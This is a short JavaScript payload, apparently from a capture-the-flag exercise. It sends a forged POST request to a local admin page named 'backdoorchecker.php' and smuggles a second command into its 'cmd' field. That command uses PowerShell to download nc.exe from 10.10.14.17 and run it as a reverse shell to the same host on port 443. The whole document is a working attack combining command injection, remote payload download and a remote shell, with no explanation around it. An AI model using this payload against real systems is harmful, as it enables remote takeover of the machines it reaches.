var request = new XMLHttpRequest();
params = 'cmd=dir|powershell -c "iwr -uri http://10.10.14.17/nc.exe -OutFile %temp%\\nc.exe"; %temp%\\nc.exe -e cmd 10.10.14.17 443';
request.open("POST", "http://localhost/admin/backdoorchecker.php", true);
request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
request.send(params);
